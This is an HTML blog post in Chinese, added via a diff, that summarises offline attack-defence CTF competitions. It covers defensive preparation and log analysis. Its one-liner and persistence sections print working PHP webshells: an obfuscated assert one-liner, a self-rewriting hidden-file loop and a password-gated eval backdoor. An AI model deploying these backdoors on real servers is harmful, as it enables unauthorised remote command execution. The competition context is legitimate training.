@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>CTF线下赛总结 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF线下攻防赛"><span class="toc-text">CTF线下攻防赛</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh登陆"><span class="toc-text">ssh登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#网络拓扑"><span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#主机发现"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#预留后门"><span class="toc-text">预留后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑盒测试"><span class="toc-text">黑盒测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#一句话"><span class="toc-text">一句话</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#权限维持"><span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag获取"><span class="toc-text">flag获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#日志分析"><span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#个人建议"><span class="toc-text">个人建议</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTF线下赛总结</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">langke</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 3, 2019&nbsp;&nbsp;15:21:43</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h1 id="CTF线下攻防赛"><a href="#CTF线下攻防赛" class="headerlink" title="CTF线下攻防赛"></a>CTF线下攻防赛</h1><a id="more"></a>
+<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/CTF/1707042315cda976443f9eca49.png" alt="导图"></p>
+<pre><code>我发现啊，安全方面的比赛基本都是CTF的、至少占了90%。可能是因为其他方向不好衡量吧。
+CTF比赛主要有三种，解题模式、战争分享模式、攻防模式。
+</code></pre><p><strong>攻防模式概述</strong></p>
+<ul>
+<li><p>攻防模式常见于线下决赛。在攻防模式中，初始时刻，所有参赛队伍拥有相同的系统环境（包含若干服务，可能位于不同的机器上），常称为 gamebox，参赛队伍挖掘网络服务漏洞并攻击对手服务获取 flag 来得分，修补自身服务漏洞进行防御从而防止扣分（当然有的比赛在防御上会设置得分，一般防御只能避免丢分）。</p>
+</li>
+<li><p>攻防模式可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续 48 小时），同时也比团队之间的分工配合与合作。</p>
+</li>
+<li><p>一般比赛的具体环境会在开赛前一天或者当天开赛前半小时由比赛主办方给出（是一份几页的小文档）。在这一段时间内，你需要根据主办方提供的文档熟悉环境并做好防御。</p>
+</li>
+<li><p>在比赛开始前半小时，这半小时内是无法进行攻击的，各支队伍都会加紧熟悉比赛网络环境，并做好防御准备。至于敌方 Gamebox 的 IP 地址，则需要靠你自己在给出网段中发现。</p>
+</li>
+<li><p>如果是分为上午下午两场攻防赛的话，那么上午和下午的 Gamebox 漏洞服务会更换（避免比赛中途休息时选手交流），但管理时要用的 IP 地址什么的不会改变。也就是 下午会换新题 。</p>
+</li>
+<li><p>一般情况下，主办方会提供网线，但并不会提供网线转接口，所以需要自备。</p>
+</li>
+</ul>
+<h4 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h4><ul>
+<li>粗略的看下web端大概有哪些模块，可能会有哪些漏洞。</li>
+<li>如果有登陆口就改个复杂的密码。</li>
+<li>ssh 的登陆密码改一个超级复杂的。</li>
+<li>上WAF、文件监控、端口扫描</li>
+<li>web目录权限做限制</li>
+</ul>
+<h4 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h4><ul>
+<li>首先理清网络拓扑关系、节点与各链路之间的关联</li>
+</ul>
+<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><ul>
+<li>同 C 段或同 B 段</li>
+<li>工具： httpscan、nmap、或者自己写的工具</li>
+</ul>
+<h4 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h4><ul>
+<li>web目录下载到本地分析、是否有可以文件。</li>
+<li>比如.bak、.svg等备份类文件，或者预留的后门</li>
+<li>工具： hm.exe、各类安全软件扫描</li>
+</ul>
+<h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/CTF/blog_2018-11-16_10-29-59.png" alt></p>
+<p>防御：</p>
+<ul>
+<li>将所有的登陆口密码进行更改</li>
+<li>将上传页面的关闭或进行更改</li>
+<li>反序列化和命令执行，找补丁或者改源码</li>
+</ul>
+<h4 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h4><ul>
+<li>控制用的一句话最好是需要菜刀配置的</li>
+<li>简单举例： <code>&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</code>连接：php？2=assert、密码为：1</li>
+</ul>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><ul>
+<li><code>.demo.php</code>前面使用一个点，在linux上能很好的隐藏文件。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	$file = <span class="string">'.demo.php'</span>;</span><br><span class="line">	$shell = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>稍微猥琐的马</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>更加猥琐的</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</span><br><span class="line">$test= <span class="string">'flag'</span>;</span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</span><br><span class="line">    header(<span class="string">"flag:$test"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h4><ul>
+<li><a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="noopener">PHP定时任务</a></li>
+</ul>
+<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>用途：</p>
+<ul>
+<li>感知正在发生的攻击，从而进行针对的防御和预防</li>
+<li>应急响应、还原攻击者的攻击路径，从而挽回已经造成的损失</li>
+</ul>
+<p>记录log脚本</p>
+<pre><code class="php"><span class="meta">&lt;?php</span>
+date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);
+$ip       = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//记录访问者的ip</span>
+$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];    <span class="comment">//访问者要访问的文件名</span>
+$parameter   = $_SERVER[<span class="string">"QUERY_STRING"</span>]; <span class="comment">//访问者要请求的参数</span>
+$time     =   date(<span class="string">'Y-m-d H:i:s'</span>,time()); <span class="comment">//访问时间</span>
+$logadd = <span class="string">'来访时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;
+
+<span class="comment">// log记录</span>
+$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);
+fwrite($fh, $logadd);
+fclose($fh);
+<span class="meta">?&gt;</span>
+</code></pre>
+<p>日志分析工具</p>
+<ul>
+<li><p>LogForensics 腾讯实验室<br><a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">https://security.tencent.com/index.php/opensource/detail/15</a></p>
+</li>
+<li><p>北风飘然@金乌网络安全实验室<br><a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/126698.html</a></p>
+</li>
+<li><p>网络ID为piaox的安全从业人员：<br><a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/110644.html</a></p>
+</li>
+<li><p>网络ID：SecSky<br><a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/8982.html</a></p>
+</li>
+<li><p>网络ID：鬼魅羊羔<br><a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/96675.html</a></p>
+</li>
+</ul>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；</li>
+<li>有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；</li>
+<li>已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。</li>
+</ul>
+<h4 id="个人建议"><a href="#个人建议" class="headerlink" title="个人建议"></a>个人建议</h4><ul>
+<li>不要为了CTF而CTF，可以作为开拓思路来了解，<strong>千万不要把时间浪费在刷题上。</strong></li>
+<li>虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。</li>
+<li>只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。</li>
+</ul>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>langke</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2019/01/03/CTF线下赛总结/">http://yoursite.com/2019/01/03/CTF线下赛总结/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="https://langkexiansheng">Langke</a></span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF思路/"># CTF思路</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/01/21/app中的加密与解密/">app中的加密与解密</a>
+            
+            
+            <a class="next" rel="next" href="/2018/12/18/去火/">去火</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
